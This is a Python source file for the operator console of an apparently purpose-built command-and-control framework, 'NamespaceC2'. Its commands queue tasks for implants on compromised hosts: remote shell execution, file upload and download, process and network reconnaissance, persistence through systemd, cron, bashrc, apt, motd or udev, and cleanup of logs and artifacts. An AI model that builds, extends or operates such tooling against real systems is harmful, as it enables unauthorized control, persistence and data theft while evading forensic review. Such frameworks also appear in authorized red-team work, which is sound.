"""Implant context commands -- available after interacting with a session."""

from __future__ import annotations

import argparse
import os
from typing import TYPE_CHECKING, List, Optional

import cmd2
from rich.markup import escape

from ..models.task import Task, TaskResult, create_task, get_results
from ..models.database import get_db
from .tables import (
    results_panel,
    session_info_panel,
    tasks_table,
)
from .theme import console

MAX_UPLOAD_BYTES = 50 * 1024 * 1024  # 50 MiB

if TYPE_CHECKING:
    from .app import NamespaceC2


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _queue_task(app: "NamespaceC2", task_type: str, args: dict | None = None) -> Task:
    """Create a task for the current session and print confirmation."""
    session = app.current_session
    task = create_task(session_id=session.id, type=task_type, args=args)
    console.print(
        f"  Queued [info]{task_type}[/info] task [implant.id]{task.id[:8]}[/implant.id] "
        f"(next beacon pickup)",
        highlight=False,
    )
    return task


def _list_tasks_for_session(session_id: str) -> List[Task]:
    """Fetch all tasks for a session, newest first."""
    db = get_db()
    rows = db.execute(
        "SELECT * FROM tasks WHERE session_id = ? ORDER BY created_at DESC",
        (session_id,),
    ).fetchall()
    return [Task.from_row(r) for r in rows]


def _get_latest_result(session_id: str, task_type: Optional[str] = None) -> Optional[TaskResult]:
    """Fetch the most recent completed result for a session, optionally filtered by type."""
    db = get_db()
    if task_type:
        row = db.execute(
            """
            SELECT r.* FROM results r
            JOIN tasks t ON r.task_id = t.id
            WHERE r.session_id = ? AND t.type = ?
            ORDER BY r.received_at DESC LIMIT 1
            """,
            (session_id, task_type),
        ).fetchone()
    else:
        row = db.execute(
            """
            SELECT r.* FROM results r
            WHERE r.session_id = ?
            ORDER BY r.received_at DESC LIMIT 1
            """,
            (session_id,),
        ).fetchone()
    return TaskResult.from_row(row) if row else None


# ---------------------------------------------------------------------------
# Command mixins -- these are methods added to the NamespaceC2 class
# ---------------------------------------------------------------------------

# --- shell ----------------------------------------------------------------

_shell_parser = cmd2.Cmd2ArgumentParser(description="Execute a shell command on the implant.")
_shell_parser.add_argument("command", nargs="+", help="Command and arguments to execute")
_shell_parser.add_argument("-t", "--timeout", type=int, default=30, help="Execution timeout in seconds")


def do_shell(self: "NamespaceC2", args: argparse.Namespace) -> None:
    """Queue a shell command for execution on the implant."""
    if not self.current_session:
        console.print("[error]Not in a session context. Use 'interact' first.[/error]")
        return
    cmd_str = " ".join(args.command)
    _queue_task(self, "shell", {"command": cmd_str, "timeout": str(args.timeout)})


# --- upload ---------------------------------------------------------------

_upload_parser = cmd2.Cmd2ArgumentParser(description="Upload a file to the implant.")
_upload_parser.add_argument("local_path", help="Local file path to upload")
_upload_parser.add_argument("remote_path", help="Destination path on the implant")
_upload_parser.add_argument("--append", action="store_true", help="Append to file instead of overwriting")


def do_upload(self: "NamespaceC2", args: argparse.Namespace) -> None:
    """Queue a file upload task."""
    if not self.current_session:
        console.print("[error]Not in a session context.[/error]")
        return
    local = os.path.expanduser(args.local_path)
    if not os.path.isfile(local):
        console.print(f"[error]Local file not found: {local}[/error]")
        return
    file_size = os.path.getsize(local)
    if file_size > MAX_UPLOAD_BYTES:
        console.print(
            f"[error]File too large: {file_size} bytes "
            f"(limit is {MAX_UPLOAD_BYTES // (1024 * 1024)} MiB).[/error]"
        )
        return
    import base64
    with open(local, "rb") as fh:
        data = fh.read()
    _queue_task(self, "upload", {
        "path": args.remote_path,
        "data": base64.b64encode(data).decode(),
        "append": "true" if args.append else "false",
        "size": str(len(data)),
    })
    console.print(f"  File size: {len(data)} bytes", style="dim")


# --- download -------------------------------------------------------------

_download_parser = cmd2.Cmd2ArgumentParser(description="Download a file from the implant.")
_download_parser.add_argument("remote_path", help="Remote file path to download")


def do_download(self: "NamespaceC2", args: argparse.Namespace) -> None:
    """Queue a file download task."""
    if not self.current_session:
        console.print("[error]Not in a session context.[/error]")
        return
    _queue_task(self, "download", {"path": args.remote_path})


# --- ls -------------------------------------------------------------------

_ls_parser = cmd2.Cmd2ArgumentParser(description="List directory contents on the implant.")
_ls_parser.add_argument("path", nargs="?", default=".", help="Directory path (default: current dir)")


def do_ls(self: "NamespaceC2", args: argparse.Namespace) -> None:
    """Queue a directory listing task."""
    if not self.current_session:
        console.print("[error]Not in a session context.[/error]")
        return
    _queue_task(self, "ls", {"path": args.path})


# --- ps -------------------------------------------------------------------

def do_ps(self: "NamespaceC2", args) -> None:
    """Queue a process listing task."""
    if not self.current_session:
        console.print("[error]Not in a session context.[/error]")
        return
    _queue_task(self, "ps")


# --- netstat --------------------------------------------------------------

def do_netstat(self: "NamespaceC2", args) -> None:
    """Queue a network connections listing task."""
    if not self.current_session:
        console.print("[error]Not in a session context.[/error]")
        return
    _queue_task(self, "netstat")


# --- ifconfig -------------------------------------------------------------

def do_ifconfig(self: "NamespaceC2", args) -> None:
    """Queue a network interface listing task."""
    if not self.current_session:
        console.print("[error]Not in a session context.[/error]")
        return
    _queue_task(self, "ifconfig")


# --- whoami ---------------------------------------------------------------

def do_whoami(self: "NamespaceC2", args) -> None:
    """Queue a whoami task."""
    if not self.current_session:
        console.print("[error]Not in a session context.[/error]")
        return
    _queue_task(self, "whoami")


# --- sysinfo --------------------------------------------------------------

def do_sysinfo(self: "NamespaceC2", args) -> None:
    """Queue a system information gathering task."""
    if not self.current_session:
        console.print("[error]Not in a session context.[/error]")
        return
    _queue_task(self, "sysinfo")


# --- persist --------------------------------------------------------------

_persist_parser = cmd2.Cmd2ArgumentParser(description="Install a persistence mechanism on the implant.")
_persist_parser.add_argument(
    "method",
    choices=["systemd", "cron", "bashrc", "xdg", "apt", "motd", "udev"],
    help="Persistence method to use",
)
_persist_parser.add_argument("--target", default=None, help="Custom target path for the persistence payload")


def do_persist(self: "NamespaceC2", args: argparse.Namespace) -> None:
    """Queue a persistence installation task."""
    if not self.current_session:
        console.print("[error]Not in a session context.[/error]")
        return
    task_args = {"method": args.method}
    if args.target:
        task_args["target"] = args.target
    _queue_task(self, "persist", task_args)


# --- cleanup --------------------------------------------------------------

_cleanup_parser = cmd2.Cmd2ArgumentParser(description="Clean up artifacts on the implant.")
_cleanup_parser.add_argument(
    "scope",
    nargs="?",
    default="full",
    choices=["full", "persistence", "artifacts", "logs"],
    help="Cleanup scope (default: full)",
)


def do_cleanup(self: "NamespaceC2", args: argparse.Namespace) -> None:
    """Queue a cleanup task."""
    if not self.current_session:
        console.print("[error]Not in a session context.[/error]")
        return
    _queue_task(self, "cleanup", {"scope": args.scope})


# --- sleep ----------------------------------------------------------------

_sleep_parser = cmd2.Cmd2ArgumentParser(description="Change the beacon sleep interval.")
_sleep_parser.add_argument("seconds", type=int, help="New sleep interval in seconds")


def do_sleep(self: "NamespaceC2", args: argparse.Namespace) -> None:
    """Change the beacon sleep interval (updates session record directly)."""
    if not self.current_session:
        console.print("[error]Not in a session context.[/error]")
        return
    if args.seconds < 1:
        console.print("[error]Sleep interval must be at least 1 second.[/error]")
        return
    from ..models.session import get_session, update_session
    session = get_session(self.current_session.id)
    if session is None:
        console.print("[error]Session not found in database.[/error]")
        return
    session.sleep_interval = args.seconds
    update_session(session)
    self.current_session = session
    console.print(
        f"  Sleep interval set to [info]{args.seconds}s[/info] (effective next beacon).",
        highlight=False,
    )


# --- kill -----------------------------------------------------------------

def do_kill(self: "NamespaceC2", args) -> None:
    """Send a shutdown command to the implant (requires confirmation)."""
    if not self.current_session:
        console.print("[error]Not in a session context.[/error]")
        return
    hostname = escape(self.current_session.hostname or self.current_session.id[:8])
    console.print(
        f"[warning]This will terminate session "
        f"[implant.id]{self.current_session.id[:8]}[/implant.id] "
        f"({hostname}).[/warning]"
    )
    try:
        answer = input("  Are you sure? [y/N] ").strip().lower()
    except (EOFError, KeyboardInterrupt):
        console.print("\n  Aborted.", style="dim")
        return
    if answer != "y":
        console.print("  Aborted.", style="dim")
        return
    from ..models.session import mark_dead
    mark_dead(self.current_session.id)
    console.print("  Session marked dead. Implant will shut down on next beacon.", style="warning")


# --- info -----------------------------------------------------------------

def do_info(self: "NamespaceC2", args) -> None:
    """Display detailed information about the current session."""
    if not self.current_session:
        console.print("[error]Not in a session context.[/error]")
        return
    panel = session_info_panel(self.current_session)
    console.print(panel)


# --- tasks ----------------------------------------------------------------

def do_tasks(self: "NamespaceC2", args) -> None:
    """Show task history for the current session."""
    if not self.current_session:
        console.print("[error]Not in a session context.[/error]")
        return
    task_list = _list_tasks_for_session(self.current_session.id)
    if not task_list:
        console.print("  No tasks for this session.", style="dim")
        return
    table = tasks_table(task_list)
    console.print(table)


# --- results --------------------------------------------------------------

_results_parser = cmd2.Cmd2ArgumentParser(description="Show the latest result for this session.")
_results_parser.add_argument(
    "task_type",
    nargs="?",
    default=None,
    help="Filter by task type (e.g. shell, ps, ls)",
)
_results_parser.add_argument(
    "--task-id",
    default=None,
    help="Show result for a specific task ID (prefix match)",
)


def do_results(self: "NamespaceC2", args: argparse.Namespace) -> None:
    """Display the latest task result for the current session."""
    if not self.current_session:
        console.print("[error]Not in a session context.[/error]")
        return

    if args.task_id:
        # Look up by task ID prefix
        db = get_db()
        row = db.execute(
            "SELECT * FROM tasks WHERE session_id = ? AND id LIKE ?",
            (self.current_session.id, args.task_id + "%"),
        ).fetchone()
        if not row:
            console.print(f"[error]No task found matching '{args.task_id}'.[/error]")
            return
        task = Task.from_row(row)
        result_rows = get_results(task.id)
        if not result_rows:
            console.print(f"  Task [implant.id]{task.id[:8]}[/implant.id] has no results yet.", style="dim")
            return
        result = result_rows[-1]
        output_str = result.output.decode("utf-8", errors="replace") if result.output else ""
        panel = results_panel(task.type, output_str, result.error or "")
        console.print(panel)
        return

    result = _get_latest_result(self.current_session.id, args.task_type)
    if not result:
        msg = "No results available"
        if args.task_type:
            msg += f" for task type '{args.task_type}'"
        console.print(f"  {msg}.", style="dim")
        return

    # Fetch the task to get its type
    db = get_db()
    task_row = db.execute("SELECT * FROM tasks WHERE id = ?", (result.task_id,)).fetchone()
    task_type = Task.from_row(task_row).type if task_row else "unknown"

    output_str = result.output.decode("utf-8", errors="replace") if result.output else ""
    panel = results_panel(task_type, output_str, result.error or "")
    console.print(panel)


# --- back -----------------------------------------------------------------

def do_back(self: "NamespaceC2", args) -> None:
    """Return to the main context."""
    if not self.current_session:
        console.print("  Already in main context.", style="dim")
        return
    hostname = self.current_session.hostname or self.current_session.id[:8]
    self.current_session = None
    self._update_prompt()
    self._switch_to_main_context()
    console.print(f"  Left session [hostname]{hostname}[/hostname].", highlight=False)


# ---------------------------------------------------------------------------
# Registration helper
# ---------------------------------------------------------------------------

# Map of command name -> (function, parser_or_None)
IMPLANT_COMMANDS = {
    "shell":    (do_shell,    _shell_parser),
    "upload":   (do_upload,   _upload_parser),
    "download": (do_download, _download_parser),
    "ls":       (do_ls,       _ls_parser),
    "ps":       (do_ps,       None),
    "netstat":  (do_netstat,  None),
    "ifconfig": (do_ifconfig, None),
    "whoami":   (do_whoami,   None),
    "sysinfo":  (do_sysinfo,  None),
    "persist":  (do_persist,  _persist_parser),
    "cleanup":  (do_cleanup,  _cleanup_parser),
    "sleep":    (do_sleep,    _sleep_parser),
    "kill":     (do_kill,     None),
    "info":     (do_info,     None),
    "tasks":    (do_tasks,    None),
    "results":  (do_results,  _results_parser),
    "back":     (do_back,     None),
}


def register_implant_commands(app_cls: type) -> None:
    """Attach all implant-context commands and their parsers to the app class."""
    for name, (func, parser) in IMPLANT_COMMANDS.items():
        method_name = f"do_{name}"
        if parser is not None:
            wrapped = _make_cmd2_method(func, parser)
            setattr(app_cls, method_name, wrapped)
        else:
            setattr(app_cls, method_name, func)


def _make_cmd2_method(func, parser):
    """Create a cmd2-compatible method wrapped with an argparser."""
    @cmd2.with_argparser(parser)
    def method(self, args):
        return func(self, args)
    method.__doc__ = func.__doc__
    return method
